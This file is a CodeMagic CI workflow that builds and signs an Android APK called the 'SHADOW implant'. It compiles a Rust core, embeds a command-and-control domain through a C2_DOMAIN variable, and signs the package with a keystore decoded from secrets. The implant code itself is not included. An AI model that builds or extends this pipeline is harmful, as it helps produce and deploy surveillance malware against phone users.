# SHADOW implant build — CodeMagic
workflows:
  build-implant:
    name: Build SHADOW Implant
    max_build_duration: 40
    instance_type: mac_mini_m1
    environment:
      java: 17
      vars:
        C2_DOMAIN: cfg-relay.marwannaili-23-07.workers.dev
    scripts:
      - name: Install Rust
        script: |
          curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --default-toolchain stable
          source "$HOME/.cargo/env"
          rustup target add aarch64-linux-android
          cargo --version
      - name: Build Rust core
        script: |
          source "$HOME/.cargo/env"
          cargo install cargo-ndk --version 3.5.4 || cargo install cargo-ndk
          cd core
          cargo ndk -t arm64-v8a -o android/app/src/main/jniLibs build --release
      - name: Copy libc++_shared
        script: |
          NDK_LIB=$(find "$HOME/android-sdk" "$HOME" -name libc++_shared.so -path "*aarch64*" 2>/dev/null | head -1)
          echo "libc++_shared: $NDK_LIB"
          if [ -n "$NDK_LIB" ]; then
            mkdir -p core/android/app/src/main/jniLibs/arm64-v8a
            cp "$NDK_LIB" core/android/app/src/main/jniLibs/arm64-v8a/
          fi
      - name: Build unsigned APK
        script: |
          cd core/android
          export C2_DOMAIN="$C2_DOMAIN"
          chmod +x gradlew
          ./gradlew assembleRelease -Punsigned
          ls -la app/build/outputs/apk/release/
      - name: Sign APK with apksigner
        script: |
          cd core/android
          echo "$IMPLANT_KEYSTORE_BASE64" | base64 -d > app/implant.jks
          curl -sSL -o /tmp/bt.zip https://dl.google.com/android/repository/build-tools_r34-linux.zip
          python3 -c "import zipfile; z=zipfile.ZipFile('/tmp/bt.zip'); open('/tmp/apksigner.jar','wb').write(z.read([n for n in z.namelist() if n.endswith('apksigner.jar')][0]))"
          IN=$(ls app/build/outputs/apk/release/*.apk | head -n1)
          OUT=app/build/outputs/apk/release/shadow-implant-signed.apk
          rm -f "$OUT"
          java -jar /tmp/apksigner.jar sign --ks app/implant.jks --ks-type JKS --ks-key-alias "$IMPLANT_KEY_ALIAS" --ks-pass "pass:$IMPLANT_KEYSTORE_PASS" --key-pass "pass:$IMPLANT_KEY_PASS" --out "$OUT" "$IN"
          java -jar /tmp/apksigner.jar verify -v "$OUT" | head -8
          ls -la "$OUT"
    artifacts:
      - core/android/app/build/outputs/apk/release/shadow-implant-signed.apk